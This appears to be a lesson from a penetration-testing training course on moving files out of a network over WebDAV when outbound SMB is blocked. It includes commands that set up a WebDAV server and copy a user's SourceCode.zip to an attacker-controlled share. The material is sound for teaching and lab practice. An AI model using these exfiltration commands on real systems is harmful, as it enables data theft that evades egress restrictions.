## SMB Uploads

We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.

#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.

#### Installing WebDav Python modules

Installing WebDav Python modules

```shell-session
glack@htb[/htb]$ sudo pip install wsgidav cheroot

#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

Connecting to the Webdav Share

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

#### Uploading Files using SMB

Uploading Files using SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
